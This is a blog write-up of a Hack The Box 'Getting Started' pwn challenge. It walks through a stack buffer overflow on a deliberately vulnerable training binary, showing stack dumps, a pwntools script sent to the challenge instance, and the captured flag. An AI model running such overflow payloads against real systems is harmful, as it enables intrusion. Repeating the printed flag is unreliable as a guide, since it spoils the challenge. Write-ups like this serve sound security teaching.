---
external: false
draft: false
title: PWN - Getting Started
snippet: ""
image:
  {
    src: "/images/htb/htb_ca_ctf.png",
    alt: "full stack web development",
  }
publishDate: 2023-03-21
category: "HTB Cyber Apocalypse"
author: "Ugur Ilter"
tags: [ctf, hacking, security]
---

```
Getting Started
Get ready for the last guided challenge and your first real exploit. It's time to show your hacking skills.

Points: 300
Difficulty: Very Easy
```

In this challenge you are given a docker instance and also some files that you can download.
The archive consisted of 3 files (flag.txt, gs, wrapper.py) and a folder which had some linux shared objects for the binary to run.
Running the gs binary i was again welcomed by a wall of text.

```
➜  challenge ./gs

Stack frame layout 

|      .      | <- Higher addresses
|      .      |
|_____________|
|             | <- 64 bytes
| Return addr |
|_____________|
|             | <- 56 bytes
|     RBP     |
|_____________|
|             | <- 48 bytes
|   target    |
|_____________|
|             | <- 40 bytes
|  alignment  |
|_____________|
|             | <- 32 bytes
|  Buffer[31] |
|_____________|
|      .      |
|      .      |
|_____________|
|             |
|  Buffer[0]  |
|_____________| <- Lower addresses


      [Addr]       |      [Value]       
-------------------+-------------------
0x00007ffd0d8a47e0 | 0x0000000000000000 <- Start of buffer
0x00007ffd0d8a47e8 | 0x0000000000000000
0x00007ffd0d8a47f0 | 0x0000000000000000
0x00007ffd0d8a47f8 | 0x0000000000000000
0x00007ffd0d8a4800 | 0x6969696969696969 <- Dummy value for alignment
0x00007ffd0d8a4808 | 0x00000000deadbeef <- Target to change
0x00007ffd0d8a4810 | 0x000055c23668e800 <- Saved rbp
0x00007ffd0d8a4818 | 0x00007f2a4388ec87 <- Saved return address
0x00007ffd0d8a4820 | 0x0000000000000001
0x00007ffd0d8a4828 | 0x00007ffd0d8a48f8


After we insert 4 "A"s, (the hex representation of A is 0x41), the stack layout like this:


      [Addr]       |      [Value]       
-------------------+-------------------
0x00007ffd0d8a47e0 | 0x0000000041414141 <- Start of buffer
0x00007ffd0d8a47e8 | 0x0000000000000000
0x00007ffd0d8a47f0 | 0x0000000000000000
0x00007ffd0d8a47f8 | 0x0000000000000000
0x00007ffd0d8a4800 | 0x6969696969696969 <- Dummy value for alignment
0x00007ffd0d8a4808 | 0x00000000deadbeef <- Target to change
0x00007ffd0d8a4810 | 0x000055c23668e800 <- Saved rbp
0x00007ffd0d8a4818 | 0x00007f2a4388ec87 <- Saved return address
0x00007ffd0d8a4820 | 0x0000000000000001
0x00007ffd0d8a4828 | 0x00007ffd0d8a48f8


After we insert 4 "B"s, (the hex representation of B is 0x42), the stack layout looks like this:


      [Addr]       |      [Value]
-------------------+-------------------
0x00007ffd0d8a47e0 | 0x4242424241414141 <- Start of buffer
0x00007ffd0d8a47e8 | 0x0000000000000000
0x00007ffd0d8a47f0 | 0x0000000000000000
0x00007ffd0d8a47f8 | 0x0000000000000000
0x00007ffd0d8a4800 | 0x6969696969696969 <- Dummy value for alignment
0x00007ffd0d8a4808 | 0x00000000deadbeef <- Target to change
0x00007ffd0d8a4810 | 0x000055c23668e800 <- Saved rbp
0x00007ffd0d8a4818 | 0x00007f2a4388ec87 <- Saved return address
0x00007ffd0d8a4820 | 0x0000000000000001
0x00007ffd0d8a4828 | 0x00007ffd0d8a48f8

◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
◉                                                                                                 ◉
◉  Fill the 32-byte buffer, overwrite the alginment address and the "target's" 0xdeadbeef value.  ◉
◉                                                                                                 ◉
◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉

>>
```

In order to reach the flag you need to fill 32 + 8 = 40 bytes of data in to the buffer and overwrite the given target address which has '0xdeadbeef' as a value in it.
But running this attack locally only gives you the fake flag which was put there for testing purposes. In order to acquire the real flag you need to run the attack on the docker instance. So i modified the given 'wrapper.py' python script. Using pwntools i successfully acquired the flag after sending 40 bytes of data to the docker instance.

```python
#!/usr/bin/python3.8
from pwn import *

# connection info
IP   = '188.166.152.84'
PORT = 31791

# start remote connection
r = remote(IP, PORT)

# craft payload
payload = b'A' * 40

# wait until prompt
r.recvregex(b'>>')

# Send payload
r.sendline(payload)

# Read flag
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')
```


![HTB](/images/htb/pwn/getting_started/flag.png)

```
Flag: HTB{b0f_s33m5_3z_r1ght?}
```